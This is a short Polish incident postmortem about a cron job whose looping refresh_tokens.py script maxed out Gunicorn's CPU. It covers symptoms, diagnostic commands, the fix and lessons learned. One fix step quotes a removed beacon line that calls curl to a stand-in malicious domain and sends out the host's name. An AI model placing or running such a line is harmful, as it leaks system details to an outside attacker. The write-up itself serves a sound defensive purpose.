# 💥 Incydent #002: Gunicorn zapętlony przez crona – CPU 200%+

## 🔍 Objawy
- Aplikacja odpowiada, ale użytkownicy nie mogą się zalogować
- Dashboard się ładuje, ale logowanie wisi / kręci się
- W `htop`/`top`: Gunicorn worker zużywa 100%+ CPU
- `df -h` w normie, `ss -tuln` – wszystko nasłuchuje
- `journalctl`, `systemctl`, `ping` – wszystko wygląda „OK”, ale system *dyszy*

## 💣 Przyczyna
- Skrypt `refresh_tokens.py` uruchamiany co 1 minutę przez `cron`
- Skrypt miał `while True` i w nieskończoność próbował odpytywać localhost
- Tworzył nowe zapętlenia – aż zużycie CPU wystrzeliło w kosmos
- Dodatkowo: miał linijkę z `curl` do zewnętrznego hosta (prawdopodobnie payload / beacon)

## 🔧 Rozwiązanie
1. Zidentyfikowano procesy przez `ps aux --sort=-%cpu`  
2. Tymczasowo zatrzymano workerów Gunicorna  
3. Zakomentowano skrypt w `crontab -e`  
4. Przywrócono oryginalny `refresh_tokens.py` z backupu  
5. Usunięto obcy kod zawierający `curl https://malicious.domain/track?id=$(hostname)`
6. Dodano logikę timeoutu oraz limit wywołań w skrypcie

## ✅ Wnioski
- Cron potrafi zniszczyć system po cichu, jeśli nie masz limitów i sanity-checków
- `ps aux`, `htop`, `strace` – to Twoi najlepsi przyjaciele przy „niby wszystko działa”
- Warto logować uruchomienia skryptów cron, nawet minimalnie
- Skrypt, który nie sprawdza stanu — może skończyć jako `fork bomb lite`

---

